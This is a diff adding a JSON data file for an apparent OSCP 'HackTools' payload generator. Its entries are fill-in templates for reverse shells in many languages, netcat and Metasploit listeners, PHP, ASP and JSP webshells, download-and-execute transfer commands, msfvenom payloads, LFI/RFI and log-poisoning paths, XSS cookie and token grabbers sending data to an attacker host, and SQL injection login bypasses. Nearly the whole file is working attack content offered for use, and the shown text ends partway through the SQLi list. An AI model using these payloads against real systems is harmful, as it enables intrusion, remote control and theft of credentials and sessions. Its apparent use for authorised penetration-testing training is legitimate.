@@ -1,0 +1,1735 @@
+{
+  "meta": {
+    "title": "OSCP HackTools — payload generators",
+    "note": "Fill LHOST/LPORT/FILE and copy a ready payload. Computed: oscp hacktools encode|decode|hash|obfuscate <text>."
+  },
+  "categories": [
+    {
+      "id": "revshell",
+      "name": "Reverse shells",
+      "desc": "Target connects back (catch: oscp hacktools listener <port>).",
+      "needs": [
+        "LHOST",
+        "LPORT"
+      ],
+      "resources": [
+        "revshells.com"
+      ],
+      "items": [
+        {
+          "section": "Bash",
+          "title": "Bash /dev/tcp",
+          "template": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
+          "desc": "",
+          "note": "run via: bash -c '...'"
+        },
+        {
+          "section": "Bash",
+          "title": "Bash 196",
+          "template": "0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Bash",
+          "title": "Bash mkfifo",
+          "template": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Bash",
+          "title": "sh /dev/tcp",
+          "template": "/bin/sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Netcat",
+          "title": "nc -e",
+          "template": "nc -e /bin/bash {LHOST} {LPORT}",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Netcat",
+          "title": "nc -c",
+          "template": "nc -c /bin/sh {LHOST} {LPORT}",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Netcat",
+          "title": "nc mkfifo",
+          "template": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
+          "desc": "no -e needed",
+          "note": ""
+        },
+        {
+          "section": "Netcat",
+          "title": "ncat",
+          "template": "ncat {LHOST} {LPORT} -e /bin/bash",
+          "desc": "",
+          "note": "--ssl for TLS"
+        },
+        {
+          "section": "Netcat",
+          "title": "busybox nc",
+          "template": "busybox nc {LHOST} {LPORT} -e /bin/sh",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Scripting",
+          "title": "python3",
+          "template": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'",
+          "desc": "also a pty",
+          "note": ""
+        },
+        {
+          "section": "Scripting",
+          "title": "python (short)",
+          "template": "export RHOST=\"{LHOST}\";export RPORT={LPORT};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Scripting",
+          "title": "perl",
+          "template": "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Scripting",
+          "title": "php",
+          "template": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Scripting",
+          "title": "ruby",
+          "template": "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Scripting",
+          "title": "lua",
+          "template": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{LPORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Scripting",
+          "title": "awk",
+          "template": "awk 'BEGIN{s=\"/inet/tcp/0/{LHOST}/{LPORT}\";while(42){do{printf \"shell>\"|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c);}}while(c!=\"exit\")close(s);}}' /dev/null",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Scripting",
+          "title": "golang",
+          "template": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{LHOST}:{LPORT}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Advanced",
+          "title": "socat (full TTY)",
+          "template": "socat TCP:{LHOST}:{LPORT} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane",
+          "desc": "fully interactive",
+          "note": "listener: socat file:`tty`,raw,echo=0 tcp-listen:{LPORT}"
+        },
+        {
+          "section": "Advanced",
+          "title": "telnet",
+          "template": "TF=$(mktemp -u);mkfifo $TF && telnet {LHOST} {LPORT} 0<$TF | /bin/sh 1>$TF",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Advanced",
+          "title": "zsh",
+          "template": "zsh -c 'zmodload zsh/net/tcp && ztcp {LHOST} {LPORT} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Windows",
+          "title": "PowerShell",
+          "template": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sx=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sx,0,$sx.Length);$s.Flush()}\"",
+          "desc": "",
+          "note": "obfuscate with: oscp hacktools obfuscate '<this>'"
+        },
+        {
+          "section": "Windows",
+          "title": "PowerShell (nc.exe)",
+          "template": "nc.exe {LHOST} {LPORT} -e cmd.exe",
+          "desc": "if nc.exe is on target",
+          "note": "/usr/share/windows-resources/binaries/nc.exe"
+        }
+      ]
+    },
+    {
+      "id": "listener",
+      "name": "Listeners",
+      "desc": "Catch an incoming reverse shell.",
+      "needs": [
+        "LPORT"
+      ],
+      "resources": [],
+      "items": [
+        {
+          "section": "Netcat",
+          "title": "nc",
+          "template": "nc -lvnp {LPORT}",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Netcat",
+          "title": "rlwrap + nc",
+          "template": "rlwrap nc -lvnp {LPORT}",
+          "desc": "arrow keys/history",
+          "note": ""
+        },
+        {
+          "section": "Netcat",
+          "title": "ncat",
+          "template": "ncat -lvnp {LPORT}",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Netcat",
+          "title": "ncat ssl",
+          "template": "ncat --ssl -lvnp {LPORT}",
+          "desc": "for TLS shells",
+          "note": ""
+        },
+        {
+          "section": "Advanced",
+          "title": "socat (TTY)",
+          "template": "socat file:`tty`,raw,echo=0 tcp-listen:{LPORT}",
+          "desc": "pairs with socat revshell",
+          "note": ""
+        },
+        {
+          "section": "Advanced",
+          "title": "pwncat-cs",
+          "template": "pwncat-cs -lp {LPORT}",
+          "desc": "auto-TTY + post-ex",
+          "note": ""
+        },
+        {
+          "section": "Metasploit",
+          "title": "multi/handler (linux)",
+          "template": "msfconsole -q -x 'use multi/handler;set payload linux/x64/shell_reverse_tcp;set LHOST {LHOST};set LPORT {LPORT};run'",
+          "desc": "",
+          "note": "set LHOST too"
+        },
+        {
+          "section": "Metasploit",
+          "title": "multi/handler (windows met)",
+          "template": "msfconsole -q -x 'use multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST {LHOST};set LPORT {LPORT};run'",
+          "desc": "",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "php",
+      "name": "PHP shells",
+      "desc": "PHP reverse shells and webshells (drop via upload/LFI).",
+      "needs": [
+        "LHOST",
+        "LPORT"
+      ],
+      "resources": [
+        "github.com/pentestmonkey/php-reverse-shell"
+      ],
+      "items": [
+        {
+          "section": "Reverse",
+          "title": "one-liner (fsockopen)",
+          "template": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+          "desc": "",
+          "note": "pentestmonkey php-reverse-shell.php for a full script"
+        },
+        {
+          "section": "Reverse",
+          "title": "one-liner (exec)",
+          "template": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Webshell",
+          "title": "system",
+          "template": "<?php system($_GET['cmd']); ?>",
+          "desc": "?cmd=id",
+          "note": ""
+        },
+        {
+          "section": "Webshell",
+          "title": "shell_exec",
+          "template": "<?php echo shell_exec($_GET['cmd']); ?>",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Webshell",
+          "title": "exec",
+          "template": "<?php echo exec($_GET['cmd']); ?>",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Webshell",
+          "title": "passthru",
+          "template": "<?php passthru($_REQUEST['cmd']); ?>",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Webshell",
+          "title": "popen",
+          "template": "<?php $h=popen($_GET['cmd'],'r');while(!feof($h))echo fread($h,4096);pclose($h); ?>",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Webshell",
+          "title": "proc_open",
+          "template": "<?php $d=[1=>['pipe','w']];$p=proc_open($_GET['cmd'],$d,$pp);echo stream_get_contents($pp[1]); ?>",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Webshell",
+          "title": "backtick exec",
+          "template": "<?=`$_GET[0]`?>",
+          "desc": "short tag; ?0=id",
+          "note": ""
+        },
+        {
+          "section": "Eval",
+          "title": "eval (POST)",
+          "template": "<?php eval($_POST['c']); ?>",
+          "desc": "run PHP via POST c=",
+          "note": ""
+        },
+        {
+          "section": "Eval",
+          "title": "assert",
+          "template": "<?php assert($_GET['c']); ?>",
+          "desc": "old PHP RCE via assert",
+          "note": ""
+        },
+        {
+          "section": "Eval",
+          "title": "preg_replace /e",
+          "template": "<?php preg_replace('/.*/e',$_GET['c'],''); ?>",
+          "desc": "legacy PHP < 7",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "webshell",
+      "name": "Webshells (asp/jsp/...)",
+      "desc": "Language webshells for upload/deploy bugs.",
+      "needs": [],
+      "resources": [
+        "/usr/share/webshells/"
+      ],
+      "items": [
+        {
+          "section": "PHP",
+          "title": "php system",
+          "template": "<?php system($_GET['cmd']); ?>",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "ASP",
+          "title": "classic asp",
+          "template": "<% eval request(\"cmd\") %>",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "ASP",
+          "title": "asp exec",
+          "template": "<% Set o=Server.CreateObject(\"WScript.Shell\"):Set e=o.Exec(Request(\"cmd\")):Response.Write e.StdOut.ReadAll() %>",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "ASPX",
+          "title": "aspx cmd",
+          "template": "<%@ Page Language=\"C#\"%><%var p=new System.Diagnostics.Process();p.StartInfo.FileName=\"cmd.exe\";p.StartInfo.Arguments=\"/c \"+Request[\"cmd\"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>",
+          "desc": "",
+          "note": "msfvenom -f aspx is more reliable"
+        },
+        {
+          "section": "JSP",
+          "title": "jsp exec",
+          "template": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
+          "desc": "",
+          "note": "msfvenom -f war for Tomcat"
+        },
+        {
+          "section": "JSP",
+          "title": "jsp output",
+          "template": "<%@ page import=\"java.util.*,java.io.*\" %><% Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\"));BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=r.readLine())!=null)out.println(l); %>",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Other",
+          "title": "CFM",
+          "template": "<cfexecute name=\"cmd.exe\" arguments=\"/c #url.cmd#\" timeout=\"10\"></cfexecute>",
+          "desc": "ColdFusion",
+          "note": ""
+        },
+        {
+          "section": "Other",
+          "title": "Perl CGI",
+          "template": "#!/usr/bin/perl\\nprint \"Content-type: text/html\\n\\n\";system($ENV{'QUERY_STRING'});",
+          "desc": "",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "tty",
+      "name": "TTY spawn & stabilise",
+      "desc": "Upgrade a raw shell to a real terminal.",
+      "needs": [
+        "LHOST",
+        "LPORT"
+      ],
+      "resources": [],
+      "items": [
+        {
+          "section": "Spawn",
+          "title": "python3 pty",
+          "template": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+          "desc": "step 1",
+          "note": ""
+        },
+        {
+          "section": "Spawn",
+          "title": "python pty",
+          "template": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
+          "desc": "if only python2",
+          "note": ""
+        },
+        {
+          "section": "Spawn",
+          "title": "script",
+          "template": "script -qc /bin/bash /dev/null",
+          "desc": "no python?",
+          "note": ""
+        },
+        {
+          "section": "Spawn",
+          "title": "perl",
+          "template": "perl -e 'exec \"/bin/bash\";'",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Spawn",
+          "title": "ruby",
+          "template": "ruby -e 'exec \"/bin/bash\"'",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Spawn",
+          "title": "expect",
+          "template": "expect -c 'spawn /bin/bash; interact'",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Stabilise",
+          "title": "stty (on YOUR box)",
+          "template": "stty raw -echo; fg",
+          "desc": "after Ctrl-Z",
+          "note": ""
+        },
+        {
+          "section": "Stabilise",
+          "title": "set env",
+          "template": "export TERM=xterm; export SHELL=/bin/bash",
+          "desc": "back in the target shell",
+          "note": ""
+        },
+        {
+          "section": "Stabilise",
+          "title": "match size",
+          "template": "stty rows 50 cols 200",
+          "desc": "run `stty size` locally",
+          "note": ""
+        },
+        {
+          "section": "Stabilise",
+          "title": "socat (full)",
+          "template": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}",
+          "desc": "fully interactive",
+          "note": "listener: socat file:`tty`,raw,echo=0 tcp-listen:{LPORT}"
+        }
+      ]
+    },
+    {
+      "id": "transfer",
+      "name": "File transfer",
+      "desc": "Move files to/from a target.",
+      "needs": [
+        "LHOST",
+        "LPORT",
+        "FILE"
+      ],
+      "resources": [
+        "/usr/share/windows-resources/binaries/ (nc.exe, plink.exe, wget.exe)"
+      ],
+      "items": [
+        {
+          "section": "Serve (you)",
+          "title": "python3 http",
+          "template": "python3 -m http.server {LPORT}",
+          "desc": "serves cwd",
+          "note": ""
+        },
+        {
+          "section": "Serve (you)",
+          "title": "python2 http",
+          "template": "python2 -m SimpleHTTPServer {LPORT}",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Serve (you)",
+          "title": "php",
+          "template": "php -S 0.0.0.0:{LPORT}",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Serve (you)",
+          "title": "ruby",
+          "template": "ruby -run -e httpd . -p {LPORT}",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Serve (you)",
+          "title": "updog",
+          "template": "updog -p {LPORT}",
+          "desc": "HTTP(S)+upload",
+          "note": ""
+        },
+        {
+          "section": "Serve (you)",
+          "title": "smbserver",
+          "template": "impacket-smbserver share . -smb2support",
+          "desc": "great for Windows",
+          "note": "target: copy \\\\{LHOST}\\share\\{FILE} ."
+        },
+        {
+          "section": "Serve (you)",
+          "title": "nc recv",
+          "template": "nc -lvnp {LPORT} > {FILE}",
+          "desc": "receiver",
+          "note": "sender: nc {LHOST} {LPORT} < {FILE}"
+        },
+        {
+          "section": "Serve (you)",
+          "title": "ftp (pure-ftpd/python)",
+          "template": "python3 -m pyftpdlib -p {LPORT} -w",
+          "desc": "anonymous writable FTP",
+          "note": ""
+        },
+        {
+          "section": "Linux pull",
+          "title": "wget",
+          "template": "wget http://{LHOST}:{LPORT}/{FILE} -O /tmp/{FILE}",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Linux pull",
+          "title": "curl",
+          "template": "curl http://{LHOST}:{LPORT}/{FILE} -o /tmp/{FILE}",
+          "desc": "",
+          "note": "| bash to run in memory"
+        },
+        {
+          "section": "Linux pull",
+          "title": "nc send",
+          "template": "nc {LHOST} {LPORT} < {FILE}",
+          "desc": "to an nc receiver",
+          "note": ""
+        },
+        {
+          "section": "Linux pull",
+          "title": "scp",
+          "template": "scp {FILE} user@{LHOST}:/tmp/",
+          "desc": "needs SSH",
+          "note": ""
+        },
+        {
+          "section": "Linux pull",
+          "title": "/dev/tcp",
+          "template": "exec 3<>/dev/tcp/{LHOST}/{LPORT}; echo -e 'GET /{FILE} HTTP/1.0\\r\\n\\r\\n' >&3; cat <&3 > /tmp/{FILE}",
+          "desc": "no wget/curl",
+          "note": ""
+        },
+        {
+          "section": "Windows pull",
+          "title": "certutil",
+          "template": "certutil -urlcache -f http://{LHOST}:{LPORT}/{FILE} {FILE}",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Windows pull",
+          "title": "powershell iwr",
+          "template": "powershell -c \"iwr http://{LHOST}:{LPORT}/{FILE} -OutFile {FILE}\"",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Windows pull",
+          "title": "WebClient",
+          "template": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://{LHOST}:{LPORT}/{FILE}','C:\\Windows\\Temp\\{FILE}')\"",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Windows pull",
+          "title": "DownloadString|iex",
+          "template": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}:{LPORT}/{FILE}')\"",
+          "desc": "in-memory",
+          "note": ""
+        },
+        {
+          "section": "Windows pull",
+          "title": "bitsadmin",
+          "template": "bitsadmin /transfer j http://{LHOST}:{LPORT}/{FILE} %temp%\\{FILE}",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Windows pull",
+          "title": "wget.exe",
+          "template": "wget.exe http://{LHOST}:{LPORT}/{FILE} -O {FILE}",
+          "desc": "",
+          "note": "/usr/share/windows-resources/binaries/"
+        },
+        {
+          "section": "Windows pull",
+          "title": "SMB copy",
+          "template": "copy \\\\{LHOST}\\share\\{FILE} .",
+          "desc": "with impacket-smbserver",
+          "note": ""
+        },
+        {
+          "section": "Manual",
+          "title": "base64 send",
+          "template": "base64 -w0 {FILE}",
+          "desc": "copy blob",
+          "note": "decode: echo '<blob>' | base64 -d > {FILE}"
+        }
+      ]
+    },
+    {
+      "id": "msfvenom",
+      "name": "MSFVenom payloads",
+      "desc": "Generate standalone payloads.",
+      "needs": [
+        "LHOST",
+        "LPORT"
+      ],
+      "resources": [],
+      "items": [
+        {
+          "section": "Windows",
+          "title": "exe (nc-catchable)",
+          "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe",
+          "desc": "catch with nc",
+          "note": ""
+        },
+        {
+          "section": "Windows",
+          "title": "exe meterpreter x64",
+          "template": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o met.exe",
+          "desc": "multi/handler",
+          "note": ""
+        },
+        {
+          "section": "Windows",
+          "title": "exe x86",
+          "template": "msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell86.exe",
+          "desc": "32-bit",
+          "note": ""
+        },
+        {
+          "section": "Windows",
+          "title": "dll",
+          "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f dll -o s.dll",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Windows",
+          "title": "msi",
+          "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f msi -o s.msi",
+          "desc": "AlwaysInstallElevated",
+          "note": ""
+        },
+        {
+          "section": "Linux",
+          "title": "elf x64",
+          "template": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell",
+          "desc": "chmod +x",
+          "note": ""
+        },
+        {
+          "section": "Linux",
+          "title": "elf x86",
+          "template": "msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell86",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Web",
+          "title": "php",
+          "template": "msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -f raw -o shell.php",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Web",
+          "title": "aspx",
+          "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f aspx -o shell.aspx",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Web",
+          "title": "jsp",
+          "template": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o shell.jsp",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Web",
+          "title": "war (Tomcat)",
+          "template": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war -o shell.war",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Scripting",
+          "title": "python",
+          "template": "msfvenom -p cmd/unix/reverse_python LHOST={LHOST} LPORT={LPORT} -f raw",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Scripting",
+          "title": "bash",
+          "template": "msfvenom -p cmd/unix/reverse_bash LHOST={LHOST} LPORT={LPORT} -f raw",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Shellcode",
+          "title": "C (badchars)",
+          "template": "msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f c -b '\\x00\\x0a\\x0d' -e x86/shikata_ga_nai",
+          "desc": "for BOF",
+          "note": ""
+        },
+        {
+          "section": "Other",
+          "title": "apk (android)",
+          "template": "msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -o app.apk",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Other",
+          "title": "macho",
+          "template": "msfvenom -p osx/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f macho -o shell.macho",
+          "desc": "",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "lfi",
+      "name": "LFI / path traversal",
+      "desc": "Local file inclusion & read-to-RCE.",
+      "needs": [
+        "LHOST",
+        "LPORT"
+      ],
+      "resources": [],
+      "items": [
+        {
+          "section": "Traversal",
+          "title": "basic",
+          "template": "../../../../../../etc/passwd",
+          "desc": "confirm the bug",
+          "note": ""
+        },
+        {
+          "section": "Traversal",
+          "title": "filter bypass",
+          "template": "....//....//....//etc/passwd",
+          "desc": "beats naive ../ strip",
+          "note": ""
+        },
+        {
+          "section": "Traversal",
+          "title": "url-encoded",
+          "template": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Traversal",
+          "title": "double-encoded",
+          "template": "%252e%252e%252fetc%252fpasswd",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Traversal",
+          "title": "null byte (old PHP)",
+          "template": "../../../../etc/passwd%00",
+          "desc": "PHP < 5.3.4",
+          "note": ""
+        },
+        {
+          "section": "Wrappers",
+          "title": "filter (read source)",
+          "template": "php://filter/convert.base64-encode/resource=index.php",
+          "desc": "leaks source",
+          "note": "base64 -d the output"
+        },
+        {
+          "section": "Wrappers",
+          "title": "php://input",
+          "template": "php://input",
+          "desc": "POST body = <?php system($_GET['c']);?> -> RCE",
+          "note": ""
+        },
+        {
+          "section": "Wrappers",
+          "title": "data://",
+          "template": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
+          "desc": "<?php system($_GET['c'])?>",
+          "note": "needs allow_url_include"
+        },
+        {
+          "section": "Wrappers",
+          "title": "expect://",
+          "template": "expect://id",
+          "desc": "if expect wrapper enabled",
+          "note": ""
+        },
+        {
+          "section": "Wrappers",
+          "title": "zip://",
+          "template": "zip://shell.jpg%23shell.php",
+          "desc": "upload a zip with PHP inside",
+          "note": ""
+        },
+        {
+          "section": "Wrappers",
+          "title": "phar://",
+          "template": "phar://shell.phar/shell.txt",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Poisoning",
+          "title": "apache access log",
+          "template": "/var/log/apache2/access.log",
+          "desc": "put PHP in User-Agent first",
+          "note": ""
+        },
+        {
+          "section": "Poisoning",
+          "title": "proc environ",
+          "template": "/proc/self/environ",
+          "desc": "poison via User-Agent",
+          "note": ""
+        },
+        {
+          "section": "Poisoning",
+          "title": "ssh auth log",
+          "template": "/var/log/auth.log",
+          "desc": "ssh with PHP username",
+          "note": ""
+        },
+        {
+          "section": "Interesting reads",
+          "title": "common files",
+          "template": "/etc/passwd  /etc/shadow  /etc/hosts  ~/.ssh/id_rsa  /proc/self/cmdline  /var/www/html/config.php",
+          "desc": "what to read",
+          "note": "see: oscp manual show file-read-primitives"
+        },
+        {
+          "section": "RFI",
+          "title": "http",
+          "template": "http://{LHOST}:{LPORT}/shell.txt",
+          "desc": "needs allow_url_include",
+          "note": ""
+        },
+        {
+          "section": "RFI",
+          "title": "smb (windows)",
+          "template": "\\\\{LHOST}\\share\\shell.php",
+          "desc": "",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "xss",
+      "name": "XSS payloads",
+      "desc": "Cookie/token grabbers & vectors.",
+      "needs": [
+        "LHOST"
+      ],
+      "resources": [],
+      "items": [
+        {
+          "section": "Grabbers",
+          "title": "cookie (location)",
+          "template": "<script>document.location='http://{LHOST}/?c='+document.cookie</script>",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Grabbers",
+          "title": "cookie (Image)",
+          "template": "<script>new Image().src='http://{LHOST}/?c='+document.cookie;</script>",
+          "desc": "no redirect",
+          "note": ""
+        },
+        {
+          "section": "Grabbers",
+          "title": "cookie (fetch)",
+          "template": "<script>fetch('http://{LHOST}/?c='+btoa(document.cookie))</script>",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Grabbers",
+          "title": "token (localStorage)",
+          "template": "<script>document.location='http://{LHOST}/?c='+localStorage.getItem('access_token')</script>",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Vectors",
+          "title": "img onerror",
+          "template": "<img src=x onerror=\"this.src='http://{LHOST}/?c='+document.cookie\">",
+          "desc": "attribute ctx",
+          "note": ""
+        },
+        {
+          "section": "Vectors",
+          "title": "svg onload",
+          "template": "<svg onload=\"fetch('http://{LHOST}/?c='+document.cookie)\">",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Vectors",
+          "title": "body onload",
+          "template": "<body onload=alert(1)>",
+          "desc": "test",
+          "note": ""
+        },
+        {
+          "section": "Vectors",
+          "title": "iframe js",
+          "template": "<iframe src=\"javascript:alert(1)\">",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Vectors",
+          "title": "input autofocus",
+          "template": "<input onfocus=alert(1) autofocus>",
+          "desc": "no click needed",
+          "note": ""
+        },
+        {
+          "section": "Vectors",
+          "title": "details ontoggle",
+          "template": "<details open ontoggle=alert(1)>",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Bypass",
+          "title": "tag split",
+          "template": "<scr<script>ipt>alert(1)</scr</script>ipt>",
+          "desc": "beats naive strip",
+          "note": ""
+        },
+        {
+          "section": "Bypass",
+          "title": "polyglot",
+          "template": "jaVasCript:/*-/*`/*\\`/*'/*\\\"/**/(/* */oNcliCk=alert() )//",
+          "desc": "fires in many contexts",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "sqli",
+      "name": "SQLi payloads",
+      "desc": "Manual SQL injection building blocks.",
+      "needs": [],
+      "resources": [],
+      "items": [
+        {
+          "section": "Columns",
+          "title": "order by",
+          "template": "' ORDER BY 1-- -",
+          "desc": "increment until error",
+          "note": ""
+        },
+        {
+          "section": "Columns",
+          "title": "union (mysql/mssql/pgsql)",
+          "template": "' UNION SELECT NULL,NULL,NULL-- -",
+          "desc": "match column count",
+          "note": ""
+        },
+        {
+          "section": "Columns",
+          "title": "union (oracle)",
+          "template": "' UNION SELECT NULL,NULL,NULL FROM DUAL-- -",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Auth bypass",
+          "title": "classic",
+          "template": "' OR '1'='1'-- -",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Auth bypass",
+          "title": "comment user",
+          "template": "admin'-- -",
+          "desc": "login as admin",
+          "note": ""
+        },
+        {
+          "section": "Auth bypass",
+          "title": "or 1=1 #",
+          "template": "' OR 1=1#",
+          "desc": "MySQL comment",
+          "note": ""
+        },
+        {
+          "section": "Auth bypass",
+          "title": "double quote",
+          "template": "\" OR \"1\"=\"1",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Enumerate (MySQL)",
+          "title": "version",
+          "template": "' UNION SELECT NULL,@@version-- -",
+          "desc": "",
+          "note": ""
+        },
